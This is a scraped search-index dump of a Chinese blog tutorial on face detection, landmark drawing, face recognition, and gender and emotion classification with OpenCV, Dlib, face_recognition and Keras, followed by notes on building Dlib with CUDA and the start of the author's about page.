\"lib/opencv/haarcascades/haarcascade_frontalface_default.xml\" ) img = cv2.imread(filepath) # 读取图片 gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) # 灰度化 color = (0, 255, 0) # 定义绘制颜色 # 调用识别人脸 faceRects = classifier.detectMultiScale( gray, scaleFactor=1.2, minNeighbors=3, minSize=(32, 32)) if len(faceRects): # 大于0则检测到人脸 for faceRect in faceRects: # 单独框出每一张人脸 x, y, w, h = faceRect # 框出人脸 cv2.rectangle(img, (x, y), (x + h, y + w), color, 2) cv2.imshow(\"image\", img) cv2.waitKey(0) cv2.destroyAllWindows() ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:2:1","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#实现思路"},{"categories":["coding"],"content":"1. 利用OpenCV进行图片人脸检测并进行标注 实现思路 先将图片灰度化，为了降低图片颜色维度，减少后续识别计算量 然后利用OpenCV加载别人训练好的人脸分类器，通过这个分类器来检测人脸 在原图片上画一个矩形，然后显示出来 实现代码 import cv2 filepath = \"img/sdu/6.jpg\" classifier = cv2.CascadeClassifier( \"lib/opencv/haarcascades/haarcascade_frontalface_default.xml\" ) img = cv2.imread(filepath) # 读取图片 gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) # 灰度化 color = (0, 255, 0) # 定义绘制颜色 # 调用识别人脸 faceRects = classifier.detectMultiScale( gray, scaleFactor=1.2, minNeighbors=3, minSize=(32, 32)) if len(faceRects): # 大于0则检测到人脸 for faceRect in faceRects: # 单独框出每一张人脸 x, y, w, h = faceRect # 框出人脸 cv2.rectangle(img, (x, y), (x + h, y + w), color, 2) cv2.imshow(\"image\", img) cv2.waitKey(0) cv2.destroyAllWindows() ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:2:1","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#实现代码"},{"categories":["coding"],"content":"2. 利用OpenCV进行视频人脸检测并进行标注 在人脸检测方面实现方法与上面图片的实现方法一模一样，只是这个图片是从摄像头不断获取的。 实现代码 import cv2 def scan(img): grayImg = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) classifier = cv2.CascadeClassifier( \"lib/opencv/haarcascades/haarcascade_frontalface_default.xml\" ) color = (0, 255, 0) # 定义绘制颜色 faceRects = classifier.detectMultiScale( grayImg, scaleFactor=1.2, minNeighbors=3, minSize=(32, 32)) if len(faceRects): # 大于0则检测到人脸 for faceRect in faceRects: # 单独框出每一张人脸 x, y, w, h = faceRect cv2.rectangle(img, (x, y), (x + h, y + w), color, 2) cv2.imshow(\"image\", img) cap = cv2.VideoCapture(0) while (1): ret, frame = cap.read() scan(frame) if cv2.waitKey(1) \u0026 0xFF == ord('q'): break cap.release() cv2.destroyAllWindows() ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:2:2","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#2-利用opencv进行视频人脸检测并进行标注"},{"categories":["coding"],"content":"2. 利用OpenCV进行视频人脸检测并进行标注 在人脸检测方面实现方法与上面图片的实现方法一模一样，只是这个图片是从摄像头不断获取的。 实现代码 import cv2 def scan(img): grayImg = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) classifier = cv2.CascadeClassifier( \"lib/opencv/haarcascades/haarcascade_frontalface_default.xml\" ) color = (0, 255, 0) # 定义绘制颜色 faceRects = classifier.detectMultiScale( grayImg, scaleFactor=1.2, minNeighbors=3, minSize=(32, 32)) if len(faceRects): # 大于0则检测到人脸 for faceRect in faceRects: # 单独框出每一张人脸 x, y, w, h = faceRect cv2.rectangle(img, (x, y), (x + h, y + w), color, 2) cv2.imshow(\"image\", img) cap = cv2.VideoCapture(0) while (1): ret, frame = cap.read() scan(frame) if cv2.waitKey(1) \u0026 0xFF == ord('q'): break cap.release() cv2.destroyAllWindows() ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:2:2","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#实现代码-1"},{"categories":["coding"],"content":"3. 利用Dlib进行图片人脸检测并标注 Dlib里面有很多算法，可以实现一些复杂的人脸识别。 在这一小节只演示用dlib内部自带的默认的人脸识别模型来进行人脸检测 实现代码 import cv2 import dlib path = \"img/sdu/658.jpg\" img = cv2.imread(path) gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) #人脸分类器 detector = dlib.get_frontal_face_detector() dets = detector(gray, 1) for face in dets: #在图片中标注人脸边框，并显示 left = face.left() top = face.top() right = face.right() bottom = face.bottom() cv2.rectangle(img, (left, top), (right, bottom), (0, 255, 0), 2) cv2.imshow(\"image\", img) cv2.waitKey(0) cv2.destroyAllWindows() ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:2:3","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#3-利用dlib进行图片人脸检测并标注"},{"categories":["coding"],"content":"3. 利用Dlib进行图片人脸检测并标注 Dlib里面有很多算法，可以实现一些复杂的人脸识别。 在这一小节只演示用dlib内部自带的默认的人脸识别模型来进行人脸检测 实现代码 import cv2 import dlib path = \"img/sdu/658.jpg\" img = cv2.imread(path) gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) #人脸分类器 detector = dlib.get_frontal_face_detector() dets = detector(gray, 1) for face in dets: #在图片中标注人脸边框，并显示 left = face.left() top = face.top() right = face.right() bottom = face.bottom() cv2.rectangle(img, (left, top), (right, bottom), (0, 255, 0), 2) cv2.imshow(\"image\", img) cv2.waitKey(0) cv2.destroyAllWindows() ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:2:3","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#实现代码-2"},{"categories":["coding"],"content":"4. 利用Dlib进行视频人脸检测并进行标注 都是相同的步骤呀，与上面大同小异 实现代码 import cv2 import dlib detector = dlib.get_frontal_face_detector() #使用默认的人类识别器模型 def scan(img): gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) dets = detector(gray, 1) for face in dets: left = face.left() top = face.top() right = face.right() bottom = face.bottom() cv2.rectangle(img, (left, top), (right, bottom), (0, 255, 0), 2) cv2.imshow(\"image\", img) cap = cv2.VideoCapture(0) while (1): ret, img = cap.read() scan(img) if cv2.waitKey(1) \u0026 0xFF == ord('q'): break cap.release() cv2.destroyAllWindows() 在两个视频中人脸检测中，我们发现 在识别准确率上 Dlib \u003e OpenCV 但是在速度上 OpenCV \u003e Dlib 后面我们会有专门的内容讲解通过GPU加速Dlib ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:2:4","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#4-利用dlib进行视频人脸检测并进行标注"},{"categories":["coding"],"content":"4. 利用Dlib进行视频人脸检测并进行标注 都是相同的步骤呀，与上面大同小异 实现代码 import cv2 import dlib detector = dlib.get_frontal_face_detector() #使用默认的人类识别器模型 def scan(img): gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) dets = detector(gray, 1) for face in dets: left = face.left() top = face.top() right = face.right() bottom = face.bottom() cv2.rectangle(img, (left, top), (right, bottom), (0, 255, 0), 2) cv2.imshow(\"image\", img) cap = cv2.VideoCapture(0) while (1): ret, img = cap.read() scan(img) if cv2.waitKey(1) \u0026 0xFF == ord('q'): break cap.release() cv2.destroyAllWindows() 在两个视频中人脸检测中，我们发现 在识别准确率上 Dlib \u003e OpenCV 但是在速度上 OpenCV \u003e Dlib 后面我们会有专门的内容讲解通过GPU加速Dlib ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:2:4","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#实现代码-3"},{"categories":["coding"],"content":"三、稍微复杂的人脸检测与识别 上面已经介绍过了简单的从一张图片或视频中的每一帧中检测到人脸并进行画框 在这一小节，我们会进一步利用Dlib这个库中更加强大的工具来实现稍微发杂一些的人脸检测任务 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:3:0","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#三稍微复杂的人脸检测与识别"},{"categories":["coding"],"content":"1. 检测人脸的5个关键点和68个关键点并显示出来 实现代码 import cv2 import dlib path = \"img/ag.png\" img = cv2.imread(path) gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) #人脸分类器 detector = dlib.get_frontal_face_detector() # 获取人脸检测器 predictor = dlib.shape_predictor( \"lib/dlib/shape_predictor_68_face_landmarks.dat\" #这里使用68点的模型，将68改成5就是使用5点的模型 ) dets = detector(gray, 1) for face in dets: shape = predictor(img, face) # 寻找人脸的68个标定点 # 遍历所有点，打印出其坐标，并圈出来. for pt in shape.parts(): pt_pos = (pt.x, pt.y) cv2.circle(img, pt_pos, 1, (0, 255, 0), 2) cv2.imshow(\"image\", img) cv2.waitKey(0) cv2.destroyAllWindows() 上人脸识别的主菜 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:3:1","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#1-检测人脸的5个关键点和68个关键点并显示出来"},{"categories":["coding"],"content":"1. 检测人脸的5个关键点和68个关键点并显示出来 实现代码 import cv2 import dlib path = \"img/ag.png\" img = cv2.imread(path) gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) #人脸分类器 detector = dlib.get_frontal_face_detector() # 获取人脸检测器 predictor = dlib.shape_predictor( \"lib/dlib/shape_predictor_68_face_landmarks.dat\" #这里使用68点的模型，将68改成5就是使用5点的模型 ) dets = detector(gray, 1) for face in dets: shape = predictor(img, face) # 寻找人脸的68个标定点 # 遍历所有点，打印出其坐标，并圈出来. for pt in shape.parts(): pt_pos = (pt.x, pt.y) cv2.circle(img, pt_pos, 1, (0, 255, 0), 2) cv2.imshow(\"image\", img) cv2.waitKey(0) cv2.destroyAllWindows() 上人脸识别的主菜 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:3:1","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#实现代码-4"},{"categories":["coding"],"content":"2. 利用face_recognition进行人脸识别 实现代码 import cv2 import face_recognition import os path = \"img/face_5107\" cap = cv2.VideoCapture(0) total_image_name = [] total_face_encoding = [] for fn in os.listdir(path): #fn 表示的是文件名q print(path + \"/\" + fn) total_face_encoding.append( face_recognition.face_encodings( face_recognition.load_image_file(path + \"/\" + fn))[0]) fn = fn[:(len(fn) - 4)] #截取图片名（这里应该把images文件中的图片名命名为为人物名） total_image_name.append(fn) #图片名字列表 while (1): ret, frame = cap.read() # 发现在视频帧所有的脸和face_enqcodings face_locations = face_recognition.face_locations(frame) face_encodings = face_recognition.face_encodings(frame, face_locations) # 在这个视频帧中循环遍历每个人脸 for (top, right, bottom, left), face_encoding in zip( face_locations, face_encodings): # 看看面部是否与已知人脸相匹配。 for i, v in enumerate(total_face_encoding): match = face_recognition.compare_faces( [v], face_encoding, tolerance=0.4) name = \"Unknown\" if match[0]: name = total_image_name[i] break # 画出一个框，框住脸 cv2.rectangle(frame, (left, top), (right, bottom), (0, 0, 255), 2) # 画出一个带名字的标签，放在框下 cv2.rectangle(frame, (left, bottom - 35), (right, bottom), (0, 0, 255), cv2.FILLED) font = cv2.FONT_HERSHEY_DUPLEX cv2.putText(frame, name, (left + 6, bottom - 6), font, 1.0, (255, 255, 255), 1) # 显示结果图像 cv2.imshow('Video', frame) if cv2.waitKey(1) \u0026 0xFF == ord('q'): break cap.release() cv2.destroyAllWindows() ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:3:2","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#2-利用face_recognition进行人脸识别"},{"categories":["coding"],"content":"2. 利用face_recognition进行人脸识别 实现代码 import cv2 import face_recognition import os path = \"img/face_5107\" cap = cv2.VideoCapture(0) total_image_name = [] total_face_encoding = [] for fn in os.listdir(path): #fn 表示的是文件名q print(path + \"/\" + fn) total_face_encoding.append( face_recognition.face_encodings( face_recognition.load_image_file(path + \"/\" + fn))[0]) fn = fn[:(len(fn) - 4)] #截取图片名（这里应该把images文件中的图片名命名为为人物名） total_image_name.append(fn) #图片名字列表 while (1): ret, frame = cap.read() # 发现在视频帧所有的脸和face_enqcodings face_locations = face_recognition.face_locations(frame) face_encodings = face_recognition.face_encodings(frame, face_locations) # 在这个视频帧中循环遍历每个人脸 for (top, right, bottom, left), face_encoding in zip( face_locations, face_encodings): # 看看面部是否与已知人脸相匹配。 for i, v in enumerate(total_face_encoding): match = face_recognition.compare_faces( [v], face_encoding, tolerance=0.4) name = \"Unknown\" if match[0]: name = total_image_name[i] break # 画出一个框，框住脸 cv2.rectangle(frame, (left, top), (right, bottom), (0, 0, 255), 2) # 画出一个带名字的标签，放在框下 cv2.rectangle(frame, (left, bottom - 35), (right, bottom), (0, 0, 255), cv2.FILLED) font = cv2.FONT_HERSHEY_DUPLEX cv2.putText(frame, name, (left + 6, bottom - 6), font, 1.0, (255, 255, 255), 1) # 显示结果图像 cv2.imshow('Video', frame) if cv2.waitKey(1) \u0026 0xFF == ord('q'): break cap.release() cv2.destroyAllWindows() ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:3:2","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#实现代码-5"},{"categories":["coding"],"content":"3. 利用face_recognition进行人脸轮廓绘制 代码实现 import face_recognition from PIL import Image, ImageDraw # 将图片文件加载到numpy 数组中 image = face_recognition.load_image_file(\"img/ag.png\") #查找图像中所有面部的所有面部特征 face_landmarks_list = face_recognition.face_landmarks(image) for face_landmarks in face_landmarks_list: facial_features = [ 'chin', # 下巴 'left_eyebrow', # 左眉毛 'right_eyebrow', # 右眉毛 'nose_bridge', # 鼻樑 'nose_tip', # 鼻尖 'left_eye', # 左眼 'right_eye', # 右眼 'top_lip', # 上嘴唇 'bottom_lip' # 下嘴唇 ] pil_image = Image.fromarray(image) d = ImageDraw.Draw(pil_image) for facial_feature in facial_features: d.line(face_landmarks[facial_feature], fill=(255, 255, 255), width=2) pil_image.show() ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:3:3","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#3-利用face_recognition进行人脸轮廓绘制"},{"categories":["coding"],"content":"3. 利用face_recognition进行人脸轮廓绘制 代码实现 import face_recognition from PIL import Image, ImageDraw # 将图片文件加载到numpy 数组中 image = face_recognition.load_image_file(\"img/ag.png\") #查找图像中所有面部的所有面部特征 face_landmarks_list = face_recognition.face_landmarks(image) for face_landmarks in face_landmarks_list: facial_features = [ 'chin', # 下巴 'left_eyebrow', # 左眉毛 'right_eyebrow', # 右眉毛 'nose_bridge', # 鼻樑 'nose_tip', # 鼻尖 'left_eye', # 左眼 'right_eye', # 右眼 'top_lip', # 上嘴唇 'bottom_lip' # 下嘴唇 ] pil_image = Image.fromarray(image) d = ImageDraw.Draw(pil_image) for facial_feature in facial_features: d.line(face_landmarks[facial_feature], fill=(255, 255, 255), width=2) pil_image.show() ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:3:3","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#代码实现"},{"categories":["coding"],"content":"4. 利用keras实现性别识别 使用keras实现性别识别 模型数据使用的是oarriaga/face_classification的模型 实现代码 import cv2 from keras.models import load_model import numpy as np import chineseText img = cv2.imread(\"img/xingye-1.png\") face_classifier = cv2.CascadeClassifier( \"lib/opencv/haarcascades/haarcascade_frontalface_default.xml\" ) gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) faces = face_classifier.detectMultiScale( gray, scaleFactor=1.2, minNeighbors=3, minSize=(140, 140)) gender_classifier = load_model( \"classifier/gender_models/simple_CNN.81-0.96.hdf5\") gender_labels = {0: '女', 1: '男'} color = (255, 255, 255) for (x, y, w, h) in faces: face = img[(y - 60):(y + h + 60), (x - 30):(x + w + 30)] face = cv2.resize(face, (48, 48)) face = np.expand_dims(face, 0) face = face / 255.0 gender_label_arg = np.argmax(gender_classifier.predict(face)) gender = gender_labels[gender_label_arg] cv2.rectangle(img, (x, y), (x + h, y + w), color, 2) img = chineseText.cv2ImgAddText(img, gender, x + h, y, color, 30) cv2.imshow(\"Image\", img) cv2.waitKey(0) cv2.destroyAllWindows() ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:3:4","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#4-利用keras实现性别识别"},{"categories":["coding"],"content":"4. 利用keras实现性别识别 使用keras实现性别识别 模型数据使用的是oarriaga/face_classification的模型 实现代码 import cv2 from keras.models import load_model import numpy as np import chineseText img = cv2.imread(\"img/xingye-1.png\") face_classifier = cv2.CascadeClassifier( \"lib/opencv/haarcascades/haarcascade_frontalface_default.xml\" ) gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) faces = face_classifier.detectMultiScale( gray, scaleFactor=1.2, minNeighbors=3, minSize=(140, 140)) gender_classifier = load_model( \"classifier/gender_models/simple_CNN.81-0.96.hdf5\") gender_labels = {0: '女', 1: '男'} color = (255, 255, 255) for (x, y, w, h) in faces: face = img[(y - 60):(y + h + 60), (x - 30):(x + w + 30)] face = cv2.resize(face, (48, 48)) face = np.expand_dims(face, 0) face = face / 255.0 gender_label_arg = np.argmax(gender_classifier.predict(face)) gender = gender_labels[gender_label_arg] cv2.rectangle(img, (x, y), (x + h, y + w), color, 2) img = chineseText.cv2ImgAddText(img, gender, x + h, y, color, 30) cv2.imshow(\"Image\", img) cv2.waitKey(0) cv2.destroyAllWindows() ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:3:4","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#实现代码-6"},{"categories":["coding"],"content":"5. 利用keras实现表情识别 实现代码 import cv2 from keras.models import load_model import numpy as np import chineseText import datetime startTime = datetime.datetime.now() emotion_classifier = load_model( 'classifier/emotion_models/simple_CNN.530-0.65.hdf5') endTime = datetime.datetime.now() print(endTime - startTime) emotion_labels = { 0: '生气', 1: '厌恶', 2: '恐惧', 3: '开心', 4: '难过', 5: '惊喜', 6: '平静' } img = cv2.imread(\"img/emotion/emotion.png\") face_classifier = cv2.CascadeClassifier( \"C:\\Python36\\Lib\\site-packages\\opencv-master\\data\\haarcascades\\haarcascade_frontalface_default.xml\" ) gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) faces = face_classifier.detectMultiScale( gray, scaleFactor=1.2, minNeighbors=3, minSize=(40, 40)) color = (255, 0, 0) for (x, y, w, h) in faces: gray_face = gray[(y):(y + h), (x):(x + w)] gray_face = cv2.resize(gray_face, (48, 48)) gray_face = gray_face / 255.0 gray_face = np.expand_dims(gray_face, 0) gray_face = np.expand_dims(gray_face, -1) emotion_label_arg = np.argmax(emotion_classifier.predict(gray_face)) emotion = emotion_labels[emotion_label_arg] cv2.rectangle(img, (x + 10, y + 10), (x + h - 10, y + w - 10), (255, 255, 255), 2) img = chineseText.cv2ImgAddText(img, emotion, x + h * 0.3, y, color, 20) cv2.imshow(\"Image\", img) cv2.waitKey(0) cv2.destroyAllWindows() ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:3:5","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#5-利用keras实现表情识别"},{"categories":["coding"],"content":"5. 利用keras实现表情识别 实现代码 import cv2 from keras.models import load_model import numpy as np import chineseText import datetime startTime = datetime.datetime.now() emotion_classifier = load_model( 'classifier/emotion_models/simple_CNN.530-0.65.hdf5') endTime = datetime.datetime.now() print(endTime - startTime) emotion_labels = { 0: '生气', 1: '厌恶', 2: '恐惧', 3: '开心', 4: '难过', 5: '惊喜', 6: '平静' } img = cv2.imread(\"img/emotion/emotion.png\") face_classifier = cv2.CascadeClassifier( \"C:\\Python36\\Lib\\site-packages\\opencv-master\\data\\haarcascades\\haarcascade_frontalface_default.xml\" ) gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) faces = face_classifier.detectMultiScale( gray, scaleFactor=1.2, minNeighbors=3, minSize=(40, 40)) color = (255, 0, 0) for (x, y, w, h) in faces: gray_face = gray[(y):(y + h), (x):(x + w)] gray_face = cv2.resize(gray_face, (48, 48)) gray_face = gray_face / 255.0 gray_face = np.expand_dims(gray_face, 0) gray_face = np.expand_dims(gray_face, -1) emotion_label_arg = np.argmax(emotion_classifier.predict(gray_face)) emotion = emotion_labels[emotion_label_arg] cv2.rectangle(img, (x + 10, y + 10), (x + h - 10, y + w - 10), (255, 255, 255), 2) img = chineseText.cv2ImgAddText(img, emotion, x + h * 0.3, y, color, 20) cv2.imshow(\"Image\", img) cv2.waitKey(0) cv2.destroyAllWindows() ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:3:5","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#实现代码-7"},{"categories":["coding"],"content":"四、利用GPU加速Dlib提高效率 在前面的小实验中我们发现了，使用Dlib来实现的人脸检测与识别速度很慢，在视频中很难实现实时性。 所以我们不仅要想，是否可以用GPU加速一下。 以前可能很麻烦，现在英伟达推出的CUDA就专门为了解决这个而生。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:4:0","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#四利用gpu加速dlib提高效率"},{"categories":["coding"],"content":"1. 首先下载CUDA CUDA下载链接 下载并安装，不必多说，一路下一步 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:4:1","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#1-首先下载cuda"},{"categories":["coding"],"content":"2. 然后下载cudnn cudnn下载链接 这里下载需要注册英伟达账号，注册就行，下载下来后解压，里面提供cudnn库文件以及头文件，需要把cudnn目录下的bin、include以及lib目录中的文件拷贝到相应的cuda目录中的bin、include和lib目录中去。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:4:2","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#2-然后下载cudnn"},{"categories":["coding"],"content":"3. 安装cmake cmake是要在后面编译Dlib用到的。 cmake下载链接 记住安装并添加path。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:4:3","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#3-安装cmake"},{"categories":["coding"],"content":"4. 编译Dlib 这里我们跳过，因为后面可以直接在安装Dlib库时让他自动编译，能自动搞何必去麻烦，如果感兴趣可以自己去编译。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:4:4","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#4-编译dlib"},{"categories":["coding"],"content":"5. 安装支持CUDA的Dlib库（会自动编译） 我们打开64位的cmd（这一个会在安装VS2017的时候提供），或者打开64位的Powershell，在里面运行安装命令 python setup.py install --yes DLIB_USE_CUDA 这一个命令会自动编译Dlib并且安装，就不用操心了。 在cmake编译的过程中可能会报出各种问题，稍微总结一下： 如果出现类似于没找到相应编译器的原因，说明vs安装可能有问题，可能是vs版本比较老，vs安装不正确，或者vs安装不完整。不管怎么说vs的安装时间会需要很长时间，而且由于vs版本的问题，安装新的vs可能会出现各种问题，如果想手动卸载重装就更坑了，这个时候可以用卸载工具进行卸载：https://github.com/Microsoft/VisualStudioUninstaller/releases,下载之后直接解压然后以运行可执行程序，等待自动清理完成，然后重新安装vs； 如果出现类似于找不到cuda的问题，请确认是否正确安装cuda；并且，如果提示找到了cuda但没有正确的cudnn，请确认是否正确地把cudnn中的lib、include和bin目录中的文件拷贝到相应的cuda目录底下； 在使用cmake编译的时候如果你更改了配置，那么需要在cmake‘中点击file中的delete cache，然后重新configure； 有一种很奇葩的现象是，有可能你的机器上已经安装过了cuda和cudnn，并且之前使用cmake configure的时候成功编译完成得到dlib的python库，但是出于某些原因需要重新安装cuda和cudnn，那么不仅需要手动卸载之前的cuda，而且最好也删除site-packages目录中所有和dlib相关的目录和文件，以及cmake输出得到的临时文件，然后重新安装cuda和cudnn，并且按照之前的步骤执行python setup.py install –yes DLIB_USE_CUDA，得到dlib的python库文件。 如果编译顺利，并且中间没有报错，可以新建一个python程序，然后import dlib成功，大功告成。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:4:5","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#5-安装支持cuda的dlib库会自动编译"},{"categories":["coding"],"content":"6. 验证新编译好的Dlib是否支持CUDA python脚本运行 import dlib print(dlib.__) print(dlib.DLIB_USE_CUDA) print(dlib.cuda.get_num_devices()) ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:4:6","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#6-验证新编译好的dlib是否支持cuda"},{"categories":["coding"],"content":"人脸检测和识别学习就告一段落了，感谢观看","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:5:0","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#人脸检测和识别学习就告一段落了感谢观看"},{"categories":null,"content":"关于 zu1k 主要介绍我自己，此页面有我的联系方式，如果你感兴趣还可以对我进行打赏","date":"0001-01-01","objectID":"https://zu1k.com/about/","series":null,"tags":null,"title":"关于","uri":"https://zu1k.com/about/"},{"categories":null,"content":"欢迎访问我的博客，这里主要分享我的一些经验、想法和作品。 你可以通过 [RSS] 和 [邮件订阅] 的方式持续关注我的博客更新 ","date":"0001-01-01","objectID":"https://zu1k.com/about/:0:0","series":null,"tags":null,"title":"关于","uri":"https://zu1k.com/about/#"},{"categories":null,"content":"关于我 嗨！我是 zu1k，出生并生活在在一个三面环海的小渔村，冬暖夏凉，环境安静祥和。我对外面的世界充满好奇，梦想着未来能有机会到世界各地去走走看看 我现在是某985院校的研究生，主要关注自动化漏洞发现相关领域，包括但不限于 Fuzzing、Static Analysis 等漏洞发现技术 热爱开源，喜欢写一些玩具，喜欢捣鼓各种新奇事物 ","date":"0001-01-01","objectID":"https://zu1k.com/about/:1:0","series":null,"tags":null,"title":"关于","uri":"https://zu1k.com/about/#关于我"},{"categories":null,"content":"编程经验 从大学才开始接触编程，第一门编程语言是 Java，后续接连学习了 Python、C、Golang、Rust 和 JavaScript 等其他语言。我对自己使用的各种编程语言有自己的看法： Java 很成熟很稳定，在我看来最重要的是适合团队合作，毕竟我身边的人还是最熟悉 Java Python 